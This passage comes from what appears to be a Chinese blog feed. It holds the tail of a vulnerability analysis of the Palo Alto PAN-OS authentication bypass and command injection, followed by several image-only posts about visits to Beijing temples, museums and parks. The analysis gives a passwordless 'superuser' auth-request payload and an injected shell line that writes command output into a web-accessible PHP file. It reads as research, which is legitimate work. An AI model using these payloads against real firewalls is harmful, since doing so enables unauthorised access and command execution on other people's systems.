accessible_vsys,  <span class="hljs-comment">// 可访问的虚拟系统(可能为空)</span><br>    __int64 auth_result,      <span class="hljs-comment">// 认证结果存储结构</span><br>    char <span class="hljs-operator">*</span>error_buf,          <span class="hljs-comment">// 错误信息缓冲区</span><br>    unsigned int error_buf_size, <span class="hljs-comment">// 错误缓冲区大小</span><br>    __int64 client_info,      <span class="hljs-comment">// 客户端信息(可选)</span><br>    __int64 extra_params,     <span class="hljs-comment">// 额外参数(可选)</span><br>    __int64 <span class="hljs-operator">*</span>response_xml     <span class="hljs-comment">// 响应XML存储指针(可选)</span><br>) &#123;<br>    <span class="hljs-comment">// 初始化变量</span><br>    char <span class="hljs-operator">*</span>auth_request_xml <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    char <span class="hljs-operator">*</span>sanitized_extra <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    char <span class="hljs-operator">*</span>debug_request_xml <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    char role_str[<span class="hljs-number">32</span>] <span class="hljs-operator">=</span> &#123;<span class="hljs-number">0</span>&#125;;<br>    int socket_fd <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span>;<br>    void <span class="hljs-operator">*</span>response_data <span class="hljs-operator">=</span> <span class="hljs-type">NULL</span>;<br>    int response_len <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    int result <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 默认失败</span><br>    <br>    <span class="hljs-comment">// 清理错误缓冲区</span><br>    <span class="hljs-operator">*</span>error_buf <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 处理可访问VSYS列表</span><br>    <span class="hljs-keyword">if</span> (accessible_vsys) &#123;<br>        <span class="hljs-comment">// 复制VSYS列表到缓冲区</span><br>        char <span class="hljs-operator">*</span>vsys_buf <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, strlen(accessible_vsys)<span class="hljs-operator">+</span><span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>vsys_buf) &#123;<br>            set_error(error_buf, <span class="hljs-string">&quot;Could not allocate buffer for VSYS names&quot;</span>);<br>            goto cleanup;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (append_string(vsys_buf, accessible_vsys)) &#123;<br>            set_error(error_buf, <span class="hljs-string">&quot;Could not copy VSYS names&quot;</span>);<br>            goto cleanup;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建认证请求XML缓冲区</span><br>    auth_request_xml <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, <span class="hljs-number">1025</span>);<br>    debug_request_xml <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, <span class="hljs-number">1025</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>auth_request_xml <span class="hljs-operator">||</span> <span class="hljs-operator">!</span>debug_request_xml) &#123;<br>        set_error(error_buf, <span class="hljs-string">&quot;Could not allocate string buffers&quot;</span>);<br>        goto cleanup;<br>    &#125;<br><br>    <span class="hljs-comment">// 转义额外参数中的特殊字符</span><br>    <span class="hljs-keyword">if</span> (extra_params) &#123;<br>        sanitized_extra <span class="hljs-operator">=</span> xmlURIEscapeStr(extra_params, <span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>&#x27; =&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 构建认证请求XML</span><br>    <span class="hljs-keyword">if</span> (is_cms_auth) &#123;<br>        <span class="hljs-comment">// CMS认证模式</span><br>        get_role_string(<span class="hljs-operator">*</span>(int<span class="hljs-operator">*</span>)(auth_result<span class="hljs-operator">+</span><span class="hljs-number">64</span>), role_str, sizeof(role_str));<br>        <br>        <span class="hljs-keyword">if</span> (accessible_vsys <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">*</span>accessible_vsys) &#123;<br>            <span class="hljs-comment">// 包含VSYS列表的请求</span><br>            append_xml(auth_request_xml, <br>                <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> cms-client=<span class="hljs-subst">\&quot;</span>yes<span class="hljs-subst">\&quot;</span> is-vsys-admin=<span class="hljs-subst">\&quot;</span>yes<span class="hljs-subst">\&quot;</span> &quot;</span><br>                <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> role=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>                username, ip_address, <span class="hljs-keyword">protocol</span>, role_str, sanitized_extra);<br>            <br>            <span class="hljs-keyword">if</span> (client_info) &#123;<br>                append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            &#125;<br>            <br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&quot;</span>);<br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&lt;vsys&gt;&quot;</span>);<br>            <br>            <span class="hljs-comment">// 添加每个VSYS</span><br>            char <span class="hljs-operator">*</span>vsys <span class="hljs-operator">=</span> strtok(accessible_vsys, <span class="hljs-string">&quot;,&quot;</span>);<br>            <span class="hljs-keyword">while</span> (vsys) &#123;<br>                append_xml(auth_request_xml, <span class="hljs-string">&quot;&lt;member&gt;%s&lt;/member&gt;&quot;</span>, vsys);<br>                vsys <span class="hljs-operator">=</span> strtok(<span class="hljs-type">NULL</span>, <span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br>            <br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&lt;/vsys&gt;&lt;/auth-request&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 不包含VSYS列表的请求</span><br>            append_xml(auth_request_xml, <br>                <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> cms-client=<span class="hljs-subst">\&quot;</span>yes<span class="hljs-subst">\&quot;</span> &quot;</span><br>                <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> role=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>                username, ip_address, <span class="hljs-keyword">protocol</span>, role_str, sanitized_extra);<br>            <br>            <span class="hljs-keyword">if</span> (client_info) &#123;<br>                append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            &#125;<br>            <br>            append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>        &#125;<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">*</span>password) &#123;<br>        <span class="hljs-comment">// 密码认证模式</span><br>        append_xml(auth_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> passwd=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, password, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-comment">// 创建调试用的请求(隐藏密码)</span><br>        append_xml(debug_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> passwd=<span class="hljs-subst">\&quot;</span>****<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-keyword">if</span> (client_info) &#123;<br>            append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            append_xml(debug_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>        &#125;<br>        <br>        append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>        append_xml(debug_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 无密码认证模式</span><br>        append_xml(auth_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-comment">// 调试请求与认证请求相同</span><br>        append_xml(debug_request_xml, <br>            <span class="hljs-string">&quot;&lt;auth-request username=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> &quot;</span><br>            <span class="hljs-string">&quot;ip-address=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> protocol=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span> %s&quot;</span>,<br>            username, ip_address, <span class="hljs-keyword">protocol</span>, sanitized_extra);<br>        <br>        <span class="hljs-keyword">if</span> (client_info) &#123;<br>            append_xml(auth_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>            append_xml(debug_request_xml, <span class="hljs-string">&quot; client=<span class="hljs-subst">\&quot;</span>%s<span class="hljs-subst">\&quot;</span>&quot;</span>, client_info);<br>        &#125;<br>        <br>        append_xml(auth_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>        append_xml(debug_request_xml, <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 记录调试信息</span><br>    <span class="hljs-keyword">if</span> (log_level <span class="hljs-operator">&gt;=</span> <span class="hljs-number">800</span>) &#123;<br>        log_debug(<span class="hljs-string">&quot;Auth request: %s&quot;</span>, debug_request_xml);<br>    &#125;<br><br>    <span class="hljs-comment">// 连接到认证服务(本地127.0.0.1:10000)</span><br>    socket_fd <span class="hljs-operator">=</span> connect_to_auth_service(<span class="hljs-number">0x7F000001</span>, <span class="hljs-number">10000</span>);<br>    <span class="hljs-keyword">if</span> (socket_fd <span class="hljs-operator">&lt;</span> <span class="hljs-number">0</span>) &#123;<br>        set_connection_error(error_buf);<br>        goto cleanup;<br>    &#125;<br><br>    <span class="hljs-comment">// 发送请求并获取响应</span><br>    response_data <span class="hljs-operator">=</span> send_and_receive(socket_fd, auth_request_xml, strlen(auth_request_xml), <span class="hljs-operator">&amp;</span>response_len);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>response_data) &#123;<br>        goto close_socket;<br>    &#125;<br><br>    <span class="hljs-comment">// 可选: 保存原始响应XML</span><br>    <span class="hljs-keyword">if</span> (response_xml) &#123;<br>        <span class="hljs-operator">*</span>response_xml <span class="hljs-operator">=</span> create_string_buffer(alloc_ptr, response_len<span class="hljs-operator">+</span><span class="hljs-number">1</span>);<br>        append_string(<span class="hljs-operator">*</span>response_xml, response_data);<br>    &#125;<br><br>    <span class="hljs-comment">// 记录响应调试信息</span><br>    <span class="hljs-keyword">if</span> (log_level <span class="hljs-operator">&gt;=</span> <span class="hljs-number">800</span>) &#123;<br>        log_debug(<span class="hljs-string">&quot;Auth response: %s&quot;</span>, response_data);<br>    &#125;<br><br>    <span class="hljs-comment">// 解析XML响应</span><br>    xmlDocPtr doc <span class="hljs-operator">=</span> xmlReadMemory(response_data, response_len, <span class="hljs-string">&quot;noname.xml&quot;</span>, <span class="hljs-type">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>doc) &#123;<br>        set_error(error_buf, <span class="hljs-string">&quot;Error parsing XML response&quot;</span>);<br>        goto close_socket;<br>    &#125;<br><br>    xmlNodePtr root <span class="hljs-operator">=</span> xmlDocGetRootElement(doc);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>root) &#123;<br>        set_error(error_buf, <span class="hljs-string">&quot;Could not get root element&quot;</span>);<br>        goto free_doc;<br>    &#125;<br><br>    <span class="hljs-comment">// 处理认证响应</span><br>    parse_auth_response(alloc_ptr, root, auth_result, error_buf, error_buf_size);<br><br>    <span class="hljs-comment">// 检查是否认证成功</span><br>    <span class="hljs-keyword">if</span> (strcmp((char<span class="hljs-operator">*</span>)(auth_result<span class="hljs-operator">+</span><span class="hljs-number">132</span>), <span class="hljs-string">&quot;success&quot;</span>) <span class="hljs-operator">==</span> <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 认证成功</span><br>        strncpy(error_buf, (char<span class="hljs-operator">*</span>)(auth_result<span class="hljs-operator">+</span><span class="hljs-number">420</span>), error_buf_size);<br>        result <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>free_doc:<br>    xmlFreeDoc(doc);<br>close_socket:<br>    close_socket(socket_fd);<br>cleanup:<br>    <span class="hljs-comment">// 释放所有资源</span><br>    <span class="hljs-keyword">if</span> (sanitized_extra) xmlFree(sanitized_extra);<br>    <span class="hljs-keyword">if</span> (auth_request_xml) free_string_buffer(auth_request_xml);<br>    <span class="hljs-keyword">if</span> (debug_request_xml) free_string_buffer(debug_request_xml);<br>    <span class="hljs-keyword">if</span> (response_data) free(response_data);<br>    <span class="hljs-keyword">if</span> (vsys_buf) free_string_buffer(vsys_buf);<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为不是 cms 然后传输的时候无密码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">authResult = authenticateUser(<br>    <span class="hljs-attribute">user</span>=user,<br>    <span class="hljs-attribute">password</span>=<span class="hljs-string">&quot;&quot;</span>,  # 密码可能在其他地方处理<br>    <span class="hljs-attribute">protocol</span>=protocolType,<br>    <span class="hljs-attribute">host</span>=remoteHost,<br>    <span class="hljs-attribute">vsys</span>=accessibleVsys,<br>    <span class="hljs-attribute">sessionData</span>=sessionData<br>)<br></code></pre></td></tr></table></figure><p>所以 payload 就是第三种 无密码认证模式</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;auth-request username<span class="hljs-operator">=</span><span class="hljs-string">&quot;superuser&quot;</span> ip-address<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> protocol<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&gt;&lt;/auth-request&gt;</span><br></code></pre></td></tr></table></figure><p>看下 10000 是什么东西：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">netstat -tulnp | <span class="hljs-keyword">grep</span> <span class="hljs-number">10000</span><br><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/mgm</span>tsrvr<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607153001829.png?imageSlim" alt="image-20250607153001829"></p><blockquote><p>暂时没有分析出来，为什么会认证成功</p></blockquote><p>认证成功后就走 else 然后根据 POST 的参数去设置 SESSION</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607160122730.png?imageSlim" alt="image-20250607160122730"></p><p>之后 EXP 的触发是通过 index.php 携带上面的 SESSION 。</p><p>watchtowr 是根据 Diff 发现 AuditLog.php、createRemoteAppwebSession.php 存在比较大的变化：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607203811754.png?imageSlim" alt="image-20250607203811754"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607203830813.png?imageSlim" alt="image-20250607203830813"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607203920292.png?imageSlim" alt="image-20250607203920292"></p><p>但是找不到具体的触发点，参考源影公众号上面的通过进程定位。通过 exp 执行命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -auxf</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sh -c <span class="hljs-built_in">export</span> <span class="hljs-attribute">panusername</span>=<span class="hljs-string">&quot;`ps -axf&gt;/var/appweb/htdocs/unauth/5rIRJW.php`&quot;</span>;export <span class="hljs-attribute">superuser</span>=<span class="hljs-string">&quot;1&quot;</span>;export <span class="hljs-attribute">isxml</span>=<span class="hljs-string">&quot;yes&quot;</span>;/usr/local/bin/sdb -e -n ha.app.local.state<br></code></pre></td></tr></table></figure><p>PHP 里面是找不到命令的，所以是在包里面。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -r <span class="hljs-string">&#x27;panusername&#x27;</span> <span class="hljs-regexp">/usr/</span>lib64/<br><br><br><span class="hljs-keyword">grep</span> -r -C <span class="hljs-number">2</span> <span class="hljs-string">&quot;panusername&quot;</span> <span class="hljs-regexp">/usr/</span>lib64/<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/</a></p></li><li><p><a href="https://paigekim29.medium.com/understanding-x-forwarded-for-header-settings-in-nginx-4929f49d57dd">https://paigekim29.medium.com/understanding-x-forwarded-for-header-settings-in-nginx-4929f49d57dd</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA">https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmA</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万寿寺</title>
      <link href="/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E4%B8%87%E5%AF%BF%E5%AF%BA/"/>
      <url>/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E4%B8%87%E5%AF%BF%E5%AF%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373687027.jpg" alt="1749373687027"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373687018.jpg" alt="1749373687018"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373687010.jpg" alt="1749373687010"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373687004.jpg" alt="1749373687004"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373686993.jpg" alt="1749373686993"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373686981.jpg" alt="1749373686981"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373686966.jpg" alt="1749373686966"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373686954.jpg" alt="1749373686954"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溜达 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国美术馆</title>
      <link href="/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E4%B8%AD%E5%9B%BD%E7%BE%8E%E6%9C%AF%E9%A6%86/"/>
      <url>/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E4%B8%AD%E5%9B%BD%E7%BE%8E%E6%9C%AF%E9%A6%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294886.jpg" alt="1749374294886"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374295004.jpg" alt="1749374295004"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294992.jpg" alt="1749374294992"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294982.jpg" alt="1749374294982"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294963.jpg" alt="1749374294963"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294951.jpg" alt="1749374294951"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294943.jpg" alt="1749374294943"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294935.jpg" alt="1749374294935"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294926.jpg" alt="1749374294926"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294921.jpg" alt="1749374294921"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294916.jpg" alt="1749374294916"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294909.jpg" alt="1749374294909"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294902.jpg" alt="1749374294902"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374294893.jpg" alt="1749374294893"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溜达 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>北海公园</title>
      <link href="/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E5%8C%97%E6%B5%B7%E5%85%AC%E5%9B%AD/"/>
      <url>/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E5%8C%97%E6%B5%B7%E5%85%AC%E5%9B%AD/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/20250608165913549.jpg" alt="1749373101981"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/20250608165913675.jpg" alt="1749373102101"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/20250608165913597.jpg" alt="1749373102095"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102089.jpg" alt="1749373102089"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/20250608165913494.jpg" alt="1749373102083"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/20250608165913411.jpg" alt="1749373102077"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/20250608165930118.jpg" alt="1749373102070"></p><p><img src="/../../../../../../Downloads/1749373102064.jpg" alt="1749373102064"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102057.jpg" alt="1749373102057"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102051.jpg" alt="1749373102051"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102045.jpg" alt="1749373102045"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102038.jpg" alt="1749373102038"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102028.jpg" alt="1749373102028"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102021.jpg" alt="1749373102021"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102016.jpg" alt="1749373102016"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102011.jpg" alt="1749373102011"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102008.jpg" alt="1749373102008"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373102004.jpg" alt="1749373102004"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101999.jpg" alt="1749373101999"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101995.jpg" alt="1749373101995"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101990.jpg" alt="1749373101990"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101986.jpg" alt="1749373101986"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101975.jpg" alt="1749373101975"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101968.jpg" alt="1749373101968"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101961.jpg" alt="1749373101961"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101954.jpg" alt="1749373101954"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101946.jpg" alt="1749373101946"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101936.jpg" alt="1749373101936"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101930.jpg" alt="1749373101930"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373101924.jpg" alt="1749373101924"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溜达 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>圆明园遗址公园</title>
      <link href="/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E5%9C%86%E6%98%8E%E5%9B%AD%E9%81%97%E5%9D%80%E5%85%AC%E5%9B%AD/"/>
      <url>/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E5%9C%86%E6%98%8E%E5%9B%AD%E9%81%97%E5%9D%80%E5%85%AC%E5%9B%AD/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826708.jpg" alt="1749373826708"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826696.jpg" alt="1749373826696"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826688.jpg" alt="1749373826688"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826682.jpg" alt="1749373826682"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826676.jpg" alt="1749373826676"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826668.jpg" alt="1749373826668"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826658.jpg" alt="1749373826658"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826646.jpg" alt="1749373826646"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826639.jpg" alt="1749373826639"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749373826631.jpg" alt="1749373826631"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溜达 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大觉禅寺</title>
      <link href="/2025/02/08/%E7%94%9F%E6%B4%BB/%E6%BA%9C%E8%BE%BE/%E5%A4%A7%E8%A7%89%E7%A6%85%E5%AF%BA/"/>
